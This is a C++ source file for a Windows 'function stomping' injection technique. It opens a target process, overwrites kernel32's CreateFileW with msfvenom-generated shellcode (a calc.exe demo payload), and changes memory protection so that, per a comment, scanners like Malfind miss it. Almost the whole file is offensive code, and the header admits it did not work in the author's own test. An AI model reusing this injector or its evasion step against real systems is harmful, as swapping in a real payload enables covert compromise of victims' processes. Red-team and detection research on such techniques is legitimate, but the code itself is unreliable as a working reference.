/*
* Title: Function Stomping
* Resources:
*	- https://github.com/Idov31/FunctionStomping
* Status: I tested it against the notepad.exe process on Windows 11, but it does not work in my experience.
*/
#include <Windows.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <iostream>
#pragma comment(lib, "Shlwapi.lib")

// Ref: https://github.com/countercept/ModuleStomping/blob/master/injectionUtils/utils.cpp
BYTE* GetFunctionBase(HANDLE hProcess, const wchar_t* wModuleName, const char* sFunctionName) {
	DWORD dwModuleListSize = 0;
	if (!EnumProcessModules(hProcess, nullptr, 0, &dwModuleListSize)) {
		return nullptr;
	}

	HMODULE* moduleList = (HMODULE*)malloc(dwModuleListSize);
	if (!moduleList) {
		return nullptr;
	}
	memset(moduleList, 0, dwModuleListSize);

	if (!EnumProcessModules(hProcess, moduleList, dwModuleListSize, &dwModuleListSize)) {
		// Retry this one more time
		if (!EnumProcessModules(hProcess, moduleList, dwModuleListSize, &dwModuleListSize)) {
			free(moduleList);
			return nullptr;
		}
	}

	BYTE* funcBase = nullptr;

	for (HMODULE* phModule = &moduleList[0]; phModule < &moduleList[dwModuleListSize / sizeof(HMODULE)]; phModule++) {
		HMODULE hCurrModule = *phModule;
		wchar_t wCurrModuleName[MAX_PATH];
		memset(wCurrModuleName, 0, MAX_PATH);

		if (GetModuleFileNameEx(hProcess, hCurrModule, wCurrModuleName, MAX_PATH - sizeof(wchar_t)) == 0) { // error
			continue;
		}

		if (StrStrI(wCurrModuleName, wModuleName)) {
			funcBase = (BYTE*)GetProcAddress(hCurrModule, sFunctionName);
			break;
		}
	}

	free(moduleList);
	return funcBase;
}

BOOL FunctionStomping() {
	DWORD dwPid = 9448; // Replace it with the target PID.
    
	// Replace the following module/function to inject shellcode, if needed.
    // Note that this module!function must be loaded by the target process,
    // and we will need to call this function on the target process after executing this program.
	LPCWSTR wTargetModule = L"kernel32.dll";
	LPCSTR sTargetFunction = "CreateFileW";

	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) return FALSE;

	BYTE* funcBase = GetFunctionBase(hProcess, wTargetModule, sTargetFunction);
	if (!funcBase) {
		std::cerr << "[x] Failed to get the function pointer: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return FALSE;
	}

	BYTE* oldFunc = nullptr;
	if (!ReadProcessMemory(hProcess, funcBase, &oldFunc, sizeof(shellcode), nullptr)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	// Change the protect to write the shellcode.
	DWORD dwOldProtect = 0;
	if (!VirtualProtectEx(hProcess, funcBase, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	// Write the shellcode.
	SIZE_T dwBytesWritten = 0;
	if (!WriteProcessMemory(hProcess, funcBase, shellcode, sizeof(shellcode), &dwBytesWritten)) {
		VirtualProtectEx(hProcess, funcBase, sizeof(shellcode), dwOldProtect, &dwOldProtect);
		CloseHandle(hProcess);
		return FALSE;
	}

	// Change the protection to WCX to evade injection scanners like Malfind:  https://www.cyberark.com/resources/threat-research-blog/masking-malicious-memory-artifacts-part-iii-bypassing-defensive-scanners.
	if (!VirtualProtectEx(hProcess, funcBase, sizeof(shellcode), PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);

	return TRUE;
}
